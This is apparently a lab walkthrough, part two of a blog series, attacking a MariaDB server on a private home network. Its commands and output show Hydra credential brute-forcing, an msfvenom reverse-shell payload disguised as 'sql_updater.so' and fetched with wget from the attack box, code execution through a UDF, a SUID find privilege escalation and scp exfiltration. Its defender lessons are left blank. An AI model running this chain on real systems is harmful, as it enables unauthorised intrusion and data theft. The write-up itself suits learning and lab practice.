---
layout: default
title: BUREAU:02
---

# TECH-BUREAU SERIES: PHASE 02
## CVE exploitation, privilege escalation and protocol tunneling.
### WHATS SHOWCASED
<section>
  <ul class="hover-card"> 
    <li>
      <span class="text-data"><strong>OFFENSE:</strong></span> Leveraging a system misscofiguration, priviledge escalating using an administrative oversight, Stealthy Data exfiltration 
    </li>
  </ul>
  <ul class="hover-card"> 
    <li>
      <span class="text-data"><strong>DEFENSE:</strong></span> Being more cautious and restrictive with the server. 
    </li> 
  </ul>
</section>

### The initial Setup
...

### PERMISSION CHANGE

root@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/PROJECT.5527# sudo chown lead_engineer:lead_engineer /home/lead_engineer/PROJECT.5527
root@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/PROJECT.5527# sudo chmod 700 /home/lead_engineer/PROJECT.5527
root@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/PROJECT.5527# ls -l
total 8
-rw-r--r-- 1 lead_engineer lead_engineer 398 Feb 14 09:03 Frame_specs.txt
-rw-r--r-- 1 root          root          396 Mar  6 13:44 Valve_specs.txt

### QUICK CHECK

intern@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd PROJECT.5527/
-bash: cd: PROJECT.5527/: Permission denied

### PASSWORD CHANGE

root@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/PROJECT.5527# sudo passwd intern
New password: +p*yckWMu5b2eW*BCP0x+NnpJ3It58Ae
Retype new password: +p*yckWMu5b2eW*BCP0x+NnpJ3It58Ae
passwd: password updated successfully


# AT4K-3XPR3S rolling out.
We are back for an other round. In this scenario we no longer rely on SSH or HTTP.<br>
We have gathered from previous enumiration that the port 3306 is up and running, the servise in question is MariaDB,<br>
which has a known vulnerability/misconfiguration we would like to exploit to gain remote code execution.<br>
For this caper we are searching for yet another piece of data - file name: "*Valve_specs.txt*".<br>
With the vulnerability researched off we pop.<br>

## 01.MySQL credential Hydra Attack

<pre data-label="hydra bruteforce"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ hydra -l admin -P ROCK_YOU_10.txt mysql://TECH-BUREAU

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
Hydra sstarting at 2026-03-13 15:05:27
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10 login tries (l:1/p:10), ~3 tries per task
[DATA] attacking mysql://TECH-BUREAU:3306/

[3306][mysql] host: <span class="orange"><strong>TECH-BUREAU</strong></span>   login: <span class="orange"><strong>admin</strong></span>   password: <span class="orange"><strong>password</strong></span>
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-03-13 15:05:27
</code></pre>

We have a hit. With the credentials secure its time to work on that CVE,<br>
prepare a reverse shell file we will send and execute within the MariaDB, granting access.<br> 

## 02.MetaSploit Venom

<pre data-label="Generate payload"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ msfvenom -p linux/x64/shell_reverse_tcp
LHOST=192.168.1.16 LPORT=4444 -f elf-so -o sql_updater.so

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: <span class="red"><strong>sql_updater.so</strong></span>
</code></pre>

We need to gaina shell on the BUREAU server, so we generate this nifty little file with **Venom**.<br>
Making sure to specify our attack box as the host and a distinct port that we shall be listening on using **netcat**.<br>
The payload is named inconspicuously as *sql_updater.so*, doesn't sound suspicious now does it.<br>

## 03.Enter the SQL

<pre data-label="SQL Login"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ mysql -h TECH-BUREAU -u admin -p
Enter password:<span class="orange"><strong>password</strong></span>

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 52
Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1-log Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
</code></pre>

We are in, time to establish a http server on our attack machine on port 4040 and send over the reverse shell.<br>

## 04.WGET via SQL and CHMOD
<pre data-label="GET + CHMOD"><code>
MariaDB [(none)]> system wget http://192.168.1.16:4040/sql_updater.so -O /tmp/sql_updater.so;
--2026-03-13 15:06:27--  http://192.168.1.16:4040/sql_updater.so
Connecting to 192.168.1.16:4040... <span class="orange"><strong>connected.</strong></span>
HTTP request sent, awaiting response... <span class="orange"><strong>200 OK</strong></span>
Length: 476 [application/octet-stream]
Saving to: ‘/tmp/sql_updater.so’

/tmp/sql_updater.so          <span class="orange"><strong>100%[=============================================>]</strong></span>     476  --.-KB/s    in 0.05s   

2026-03-13 15:06:27 (9.37 KB/s) - ‘<span class="red"><strong>/tmp/sql_updater.so’</strong></span> saved [476/476]

MariaDB [(none)]> system chmod +x /tmp/sql_updater.so;
</code></pre>

To use a non sql command we have to use system as a precursor and make sure to put a semicolon on the end of teh command.<br>
We use a standart wget call that is going to teh attack box and port 4040.<br>
The file is downloaded succesfully and we add the executable bit to it for our exploit.<br>

## 05.GAINING A SHELL
<pre data-label="shell initiated"><code>
MariaDB [(none)]> CREATE FUNCTION <span class="orange"><strong>sys_exec</strong></span> RETURNS INT SONAME <span class="red"><strong>'sql_updater.so'</strong></span>;
ERROR 2013 (HY000): Lost connection to server during query  
</code></pre>

Here we envoke a function that the database would read, but because of a missconfiguration in the settings<br>
and an unpached service it is actualy executing the file we have provided.<br>
The MariaDB connection hangs and we gain a shell on our atack box's netcat listener.<br>

<pre data-label="shell recieved"><code>
<span class="orange"><strong>square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.10 55712
</code></pre>

## 06.STABILIZING THE SHELL

<pre data-label="shell stabelized"><code>
<span class="orange">square@AT4K-3XPR3S:</strong></span>~/BUREAU.02$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.10 55712
<span class="orange">python3 -c "import pty;pty.spawn('/bin/bash')"</strong></span>
mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ <span class="orange">export TERM=xterm</strong></span>
export TERM=xterm ## <span class="orange">PRESS CTRL-Z</strong></span> ##
mysql@TECH-BUREAU-UBUNTU-24:/var/lib/mysql$ ^Z
[1]+  Stopped                 nc -lvnp 4444
square@AT4K-3XPR3S:~/BUREAU.02$ <span class="orange">stty raw -echo; fg</strong></span>
nc -lvnp 4444
             <span class="orange">whoami</strong></span>
mysql
<span class="orange">mysql@TECH-BUREAU-UBUNTU-24:</strong></span>/var/lib/mysql$ 
</code></pre>

## 07.CD IN TO PROJECT

mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd PROJECT.5527/
bash: cd: PROJECT.5527/: Permission denied
mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer$ cd TOOLS
mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls
'=1000'   engineer_find
mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ 


FINDING THE SUID

mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ls -l
total 200
-rwsr-xr-x 1 lead_engineer lead_engineer 204264 Mar 12 10:39  engineer_find

PRIVILEGE ESCALATION

mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ ./engineer_find . -exec /bin/bash -p \; -quit
bash-5.2$ whoami
lead_engineer
bash-5.2$ 


CAT DATA

bash-5.2$ cd PROJECT.5527/
bash-5.2$ ls
Frame_specs.txt  Valve_specs.txt
bash-5.2$ cat Valve_specs.txt 
T1s shall use poppet valves!
(Instead of the normal spool-shaped, sliding valve system.)
As a cam shaft rotates, either the intake valve or the exhaust valve is opened.
Steam is admitted to the cylinder and the valve is closed.
The process repeats for the exhaust.
A dedicated exhaust valve is opened, allowing steam to escape the cylinder.

Result: dramatically improved steam-usage efficiency.
bash-5.2$ 


SCP DATA


bash-5.2$ scp Valve_specs.txt square@192.168.1.16:~/BUREAU.02/
The authenticity of host '192.168.1.16 (192.168.1.16)' can't be established.
ED25519 key fingerprint is SHA256:4km0uXkh784O7Fc9TGf4Yc8rC2+2ZmvxXSkYLMD8w/Y.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/nonexistent/.ssh' (No such file or directory).
Failed to add the host to the list of known hosts (/nonexistent/.ssh/known_hosts).
square@192.168.1.16's password: 
Valve_specs.txt                               100%  396    37.5KB/s   00:00   

EXIT

exit
mysql@TECH-BUREAU-UBUNTU-24:/home/lead_engineer/TOOLS$ exit
exit





# TECH-BUREAU ROLLING OUT

## 01.Recognisence

## LESSONS LEARNED
#### As the attacker:<br>
* <br>
* <br>
* <br>

#### As the defender:<br>
* <br>
* <br>
* .<br>
<br>
Continue?
<br>
[**TECH-BUREAU-SERIES: PHASE 03.** ](./TECH-BUREAU-PHASE-03.md) <br>
*Phish, infect, persist, escalate, obfuscate and extract. The system has been hardened to the fullest.<br>
A phishing campaign  is now in the cards, but how can we extract the data this time to dupe the TECH-BUREAU?<br>
**STAY TUNED TO FIND OUT!***

<div class="divider-wire">
  <span class="line"></span>
  <span class="symbol">⦿</span>
  <span class="line"></span>
</div>
<p class="text-center">[3.2]</p>
